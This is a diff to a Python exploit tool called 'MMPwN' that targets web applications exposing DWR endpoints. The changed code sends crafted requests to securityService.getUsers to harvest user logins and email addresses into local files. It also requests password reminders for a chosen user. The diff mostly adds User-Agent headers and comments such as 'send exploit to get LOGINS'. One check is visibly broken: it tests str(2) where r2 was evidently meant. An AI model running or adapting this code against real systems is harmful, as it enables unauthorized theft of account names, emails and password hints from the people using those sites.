@@ -68,11 +68,14 @@ class Cofe:
                     print("[-] \t /interesting entry files in robots.txt ! \n")
     
 
+
     """ self explained """
     def ToString(self):
         print(warning("=== MMPwN ==="))
         print(warning("URL : {}".format(self.url)))
         print(warning("Agent: {}".format(self.agent)))
+
+
 
     """ this method is used for search dwr path.. """
     def HaveDWR(self):
@@ -82,7 +85,7 @@ class Cofe:
             print(vulnerable(" [+] Critical! Find DWR PATH: {}".format(self.url+"dwr")))
 
     
-
+    """ this path is usually found .. """
     def HaveDWRView(self):
         print(info(("[+] Finding Other dwr path")))
         r = requests.get(self.url+"dwr-view/", headers={"User-Agent":self.agent}, verify=False)
@@ -113,10 +116,12 @@ class Cofe:
             print(critical("[+] ADMIN path found: {} \n".format(self.url+"admin/admin.login.action")))
 
 
+
+    """  send exploit to get LOGINS and save on a file  """
     def XptGetUsersLogin(self):
         exploit = {"callCount":1,"page":"/dwr-view/test/userService","httpSessionId":"","scriptSessionId":'15467B75AB0FF3158D39ADF6D866C078381',
         "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
-        r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, verify=False)
+        r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", headers={'User-Agent':self.agent}, data=exploit, verify=False)
         #print(r.text)
         if "200" in str(r) and not "404" in r.text:
             print(vulnerable("[+] Getting Possible logins... \n"))
@@ -129,11 +134,11 @@ class Cofe:
         f.close()    
 
 
-
+    """  send exploit to get EMAILS and save on a file  """
     def xpltUserEmail(self):
         exploit = {"callCount":1,"page":"/dwr-view/test/userService","httpSessionId":"","scriptSessionId":'15467B75AB0FF3158D39ADF6D866C078381',
         "c0-scriptName":"securityService","c0-methodName":"getUsers", "c0-id":0, "c0-param0":"number:0", "c0-param1":"boolean:false", "batchId":2}
-        r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, verify=False)
+        r = requests.post(self.url + "dwr/call/plaincall/securityService.getUsers.dwr", data=exploit, headers={'User-Agent':self.agent}, verify=False)
         f = open('./mails-file.txt', 'w')
         if "200" in str(r) and not "404" in r.text:
             print(vulnerable("\n[+] Getting Emails... \n"))
@@ -153,7 +158,7 @@ class Cofe:
             remainderUser = input("[+] Type the user to get ther password Remainder:  ").lower()
             xpltUser = {"callCount":1,"page":"/dwr-view/test/securityService","httpSessionId":"CDB3084D13EEC28BED7EAC3CE49F902C","scriptSessionId":"5EE540BF8C30DE30ACD6E0045EC3D44C464",
             "c0-scriptName":"securityService","c0-methodName":"getPasswordReminder","c0-id":"0","c0-param0":"string:"+remainderUser,"batchId":'2'}
-            r2 = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", data=xpltUser, verify=False)
+            r2 = requests.post(self.url + "dwr-view/call/plaincall/securityService.getPasswordReminder.dwr", headers={'User-Agent':self.agent}, data=xpltUser, verify=False)
             if "200" in str(2) and not "404" in r.text:
                 print(r2.text)
 
